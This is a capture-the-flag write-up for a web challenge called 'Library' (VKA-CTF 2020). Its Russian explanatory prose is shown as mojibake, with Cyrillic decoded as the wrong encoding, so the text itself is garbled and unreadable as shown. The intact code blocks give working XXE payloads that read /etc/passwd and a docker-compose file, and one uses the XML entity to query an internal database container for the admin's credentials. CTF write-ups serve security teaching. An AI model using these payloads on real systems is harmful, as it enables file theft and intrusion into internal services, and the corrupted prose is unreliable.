## –ë–∏–±–ª–∏–æ—Ç–µ–∫–∞

| –°–æ–±—ã—Ç–∏–µ | –ù–∞–∑–≤–∞–Ω–∏–µ | –ö–∞—Ç–µ–≥–æ—Ä–∏—è | –°–ª–æ–∂–Ω–æ—Å—Ç—å |
|:--------|:---------|:----------|----------:|
| VKA-CTF`2020 | –ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ | Web | 4-5 –∫—É—Ä—Å |

### –û–ø–∏—Å–∞–Ω–∏–µ
> –ê–≤—Ç–æ—Ä: [ ùïÇùï£ùïíùï¶ùï§ùïñ ]
>
> –í —ç—Ç–æ–π [–±–∏–±–ª–∏–æ—Ç–µ–∫–µ](https://army-library.vkactf.tk) —Å–æ–±—Ä–∞–Ω—ã –ª—É—á—à–∏–µ –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –æ –≤–æ–π–Ω–µ. –°–æ–≤—Å–µ–º –Ω–µ–¥–∞–≤–Ω–æ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–æ–±–∞–≤–∏–ª–∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —Å–æ–∑–¥–∞–≤–∞—Ç—å –ø—Ä–æ—Ñ–∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π. –ò–Ω—Ç–µ—Ä–µ—Å–Ω–æ, –∞ –∫–∞–∫—É—é –ª–∏—Ç–µ—Ä–∞—Ç—É—Ä—É —á–∏—Ç–∞–µ—Ç —Å–∞–º –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä?
>
> –§–∞–π–ª—ã –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ `/src/`

### –†–µ—à–µ–Ω–∏–µ

![](./images/1.PNG)

–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –¥–∞–Ω–Ω—ã—Ö –≤ –ø—Ä–æ—Ñ–∏–ª–µ —É—è–∑–≤–∏–º–æ –∫ XXE –∏–Ω—ä–µ–∫—Ü–∏–∏. –¢–∞–∫ –∫–∞–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –æ—Ç–≤–µ—á–∞–µ—Ç –Ω–æ–≤—ã–º –∏–º–µ–Ω–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ–≥–¥–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –æ—à–∏–±–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –ª–∏–±–æ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç, —Ç–æ –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ –ø–æ–ª–µ –¥–ª—è –∏–Ω—ä–µ–∫—Ü–∏–∏. 

![](./images/img1.PNG)

–ï—Å–ª–∏ –∏–∑–º–µ–Ω–∏—Ç—å –∑–∞–≥–æ–ª–æ–≤–æ–∫ `content-type` –Ω–∞ `application/xml`, –∞ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ 
```xml
<root><new_name>I want XXE</new_name><new_email>lol@kek.oru</new_email><new_description>I want flag</new_description><new_password>hard password</new_password></root>
```
—Ç–æ –º—ã –ø–æ–ª—É—á–∏–º —É—Å–ø–µ—à–Ω–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –¥–∞–Ω–Ω—ã—Ö

![](./images/img2.PNG)

–¢–∞–∫ –∫–∞–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞–ø–∏—Å–∞–Ω–æ –Ω–∞ —è–∑—ã–∫–µ `python`, —Ç–æ –ø–æ–ø—Ä–æ–±—É–µ–º –Ω–∞–π—Ç–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –∏ –ø—Ä–æ—á–∏—Ç–∞—Ç—å –µ–≥–æ.

–ò—Å–ø–æ–ª—å–∑—É—è —Å–ª–µ–¥—É—é—â—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –º–æ–∂–µ–º –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Å–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–µ—Ä–≤–µ—Ä–∞ `/etc/passwd`

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><new_name>&xxe;</new_name><new_email>lol@kek.oru</new_email><new_description>I want flag</new_description><new_password>hard password</new_password></root>
```

![](./images/img3.PNG)

–£—á–∏—Ç—ã–≤–∞—è –ø–æ–¥—Å–∫–∞–∑–∫—É –≤ –æ–ø–∏—Å–∞–Ω–∏–∏ —Ç–∞—Å–∫–∞ –∏ –ø–æ–ø—ã—Ç–∞–≤ –Ω–µ–º–Ω–æ–≥–æ —É–¥–∞—á–∏ –Ω–∞—Ö–æ–¥–∏–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ `app.py`

–ò–∑—É—á–∏–≤ –ª–æ–≥–∏–∫—É –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –∑–∞–º–µ—á–∞–µ–º, —á—Ç–æ –æ–Ω–æ –æ–±—â–∞–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é `GraphQL` —Å –¥—Ä—É–≥–∏–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º –ø–æ –∞–¥—Ä–µ—Å—É, —É–∫–∞–∑–∞–Ω–Ω–æ–º—É –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –æ–∫—Ä—É–∂–µ–Ω–∏—è `app.config["API"]`

–ò—Å–ø–æ–ª—å–∑—É—è [—ç—Ç–æ](https://apis.guru/graphql-voyager/) –ª–∏–±–æ –¥—Ä—É–≥–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è (–ª–∏–±–æ –∏–∑—É—á–∏–≤ –∫–æ–¥), –º–æ–∂–µ–º —É–∑–Ω–∞—Ç—å —Å—Ö–µ–º—ã –∑–∞–ø—Ä–æ—Å–æ–≤ –∫ —ç—Ç–æ–º—É `api`. –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ –ø–æ–ª—É—á–∞–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é –∑–∞–ø—Ä–æ—Å–∞ `findUser`, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
```
{findUser(name:"admin"){name password img description}}
```

–£–∑–Ω–∞–≤ –ª–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –ø–æ–ª—É—á–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç—É

![](./images/img4.PNG)

–ò–∑—É—á–∏–≤ –ø–æ–¥—Å–∫–∞–∑–∫—É, –ø–æ–ø—Ä–æ–±—É–µ–º –Ω–∞–π—Ç–∏ —Ñ–∞–π–ª `docker-compose.yml`, —á—Ç–æ–±—ã —É–∑–Ω–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –¥—Ä—É–≥–∏—Ö –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞—Ö

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file://src/docker-compose.yml">
]>
<root><new_name>&xxe;</new_name><new_email>lol@kek.oru</new_email><new_description>I want flag</new_description><new_password>hard password</new_password></root>
```

–í–∏–¥–∏–º, —á—Ç–æ –≤—Å–µ 3 –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –æ–¥–Ω–æ–π —Å–µ—Ç–∏ `custom_network_library`

–ò—Å—Ö–æ–¥—è –∏–∑ —ç—Ç–æ–≥–æ, –º–æ–∂–µ–º –æ–±—Ä–∞—Ç–∏—Ç—å—Å—è –∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—É `database-dev` –ø–æ –µ–≥–æ –∏–º–µ–Ω–∏ –∏ –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ `admin`

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://database-dev:5000/?query=%7BfindUser(name:%22admin%22)%7Bdescription%7D%7D">
]>
<root><new_name>&xxe;</new_name><new_email>lol@kek.oru</new_email><new_description>I want flag</new_description><new_password>hard password</new_password></root>
```

![](./images/img5.PNG)

**–§–ª–∞–≥:**

>vka{xx3_15_d4n9320u5_f02_7h3_4pp11c4710n}